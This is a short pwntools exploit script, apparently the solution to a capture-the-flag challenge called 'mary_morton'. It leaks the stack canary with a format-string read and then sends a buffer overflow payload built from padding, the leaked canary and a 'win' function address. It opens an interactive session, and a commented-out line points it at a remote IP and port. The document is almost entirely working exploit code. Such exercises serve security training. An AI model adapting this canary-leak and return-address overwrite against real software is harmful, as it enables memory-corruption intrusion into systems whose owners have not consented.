from pwn import *
elf = ELF("mary_morton")
p = process("./mary_morton")
#gdb.attach("mary_morton")
context(log_level="debug")
#host,port = '111.200.241.244',55554
#p = remote(host,port)
#============================
p.sendlineafter(" battle \n","2")
leak = "%23$p"
p.sendline(leak)
canary = p.recv(18)
canary = int(canary,16)
print hex(canary)
win = 0x004008de
#win = 0x400826
pad = "A"*0x88
exploit = pad + p64(canary) + p64(1) + p64(win)
p.sendlineafter("battle \n","1")
p.sendline(exploit)
p.interactive()
